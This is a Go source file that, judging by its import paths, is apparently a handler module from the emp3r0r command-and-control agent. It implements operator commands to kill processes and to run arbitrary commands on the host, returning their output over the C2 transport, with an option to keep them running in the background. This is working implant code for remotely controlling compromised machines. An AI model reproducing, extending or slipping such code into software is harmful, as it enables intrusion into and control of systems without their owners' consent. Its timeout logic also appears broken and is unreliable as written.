package handler

import (
	"bytes"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/c2transport"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

// killCmdRun kills the specified process.
func killCmdRun(cmd *cobra.Command, args []string) {
	pid, _ := cmd.Flags().GetInt("pid")
	if pid == 0 {
		c2transport.C2RespPrintf(cmd, "error: no pid specified")
		return
	}
	proc, err := os.FindProcess(pid)
	if err != nil {
		c2transport.C2RespPrintf(cmd, "Failed to find process %d: %v", pid, err)
		return
	}
	if err = proc.Kill(); err != nil {
		c2transport.C2RespPrintf(cmd, "Failed to kill process %d: %v", pid, err)
		return
	}
	c2transport.C2RespPrintf(cmd, "Process %d killed", pid)
}

// execCmdRun executes a command and returns its output.
func execCmdRun(cmd *cobra.Command, args []string) {
	cmdStr, _ := cmd.Flags().GetString("cmd")
	if cmdStr == "" {
		c2transport.C2RespPrintf(cmd, "exec: empty command")
		return
	}
	parsed := util.ParseCmd(cmdStr)
	if runtime.GOOS == "windows" && !strings.HasSuffix(parsed[0], ".exe") {
		parsed[0] += ".exe"
	}
	execCmd := exec.Command(parsed[0], parsed[1:]...)
	var outBuf bytes.Buffer
	execCmd.Stdout = &outBuf
	execCmd.Stderr = &outBuf
	err := execCmd.Start()
	if err != nil {
		c2transport.C2RespPrintf(cmd, "exec failed: %v", err)
		return
	}
	// If not running in background, wait with a timeout.
	keepRunning, _ := cmd.Flags().GetBool("bg")
	if !keepRunning {
		execCmd.Wait()
		go func() {
			// kill after 10 seconds if still alive
			time.Sleep(10 * time.Second)
			if util.IsPIDAlive(execCmd.Process.Pid) {
				_ = execCmd.Process.Kill()
			}
		}()
	} else {
		c2transport.C2RespPrintf(cmd, "Command '%s' running in background, PID %d", cmdStr, execCmd.Process.Pid)
		return
	}
	c2transport.C2RespPrintf(cmd, "%s", outBuf.String())
}
